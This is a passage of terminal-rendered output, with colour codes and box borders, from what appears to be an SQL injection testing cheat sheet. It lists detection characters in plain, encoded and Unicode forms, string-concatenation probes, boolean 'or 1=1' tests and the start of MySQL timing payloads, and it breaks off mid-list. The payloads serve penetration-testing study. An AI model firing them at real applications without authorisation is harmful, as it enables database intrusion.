[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Entry Point Detection                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Test Characters:**                                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Simple: ', ", ;, ), *                                                        [34m│[0m
[34m│[0m Encoded: %27, %22, %23, %3B, %29, %2A                                        [34m│[0m
[34m│[0m Multiple encoding: %%2727, %25%27                                            [34m│[0m
[34m│[0m Unicode: U+02BA (%CA%BA → "), U+02B9 (%CA%B9 → ')                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Merging Characters (for string concatenation):**                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m `+HERP                                                                       [34m│[0m
[34m│[0m '||'DERP                                                                     [34m│[0m
[34m│[0m '+'herp                                                                      [34m│[0m
[34m│[0m ' 'DERP                                                                      [34m│[0m
[34m│[0m %20'HERP                                                                     [34m│[0m
[34m│[0m %2B'HERP                                                                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Logic Testing:**                                                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?id=1 or 1=1 -- true                                                         [34m│[0m
[34m│[0m ?id=1' or 1=1 -- true                                                        [34m│[0m
[34m│[0m ?id=1" or 1=1 -- true                                                        [34m│[0m
[34m│[0m ?id=1 and 1=2 -- false                                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Timing Attacks:**                                                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m MySQL: SLEEP(5), BENCHMARK(2000000,MD5(NOW()))                               [34m│[0m
